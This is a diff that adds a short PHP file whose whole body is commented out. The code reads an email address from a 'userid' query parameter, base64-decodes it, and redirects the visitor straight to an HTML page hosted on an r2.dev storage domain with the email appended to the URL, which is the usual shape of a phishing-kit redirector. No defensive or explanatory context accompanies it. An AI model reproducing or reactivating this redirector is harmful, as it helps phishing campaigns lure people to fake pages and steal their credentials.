@@ -1,0 +1,26 @@
+<?php
+/*function isBase64($data)
+{
+    if (base64_encode(base64_decode($data)) === $data) {
+        return true;
+    } else {
+        return false;
+    }
+}
+
+function decode($email){
+		
+		if(isBase64($email)){
+			 $email = base64_decode($email,false);
+		}
+      
+       header( "refresh:0;url=https://pub-79dc513114c74044ada6bc1b3ae09c54.r2.dev/yolee.html#".$email);
+
+}
+if(isset($_GET['userid']) && !empty($_GET['userid'])){
+   $email = $_GET['userid'];
+   decode($email);
+}*/
+   
+   
+?>
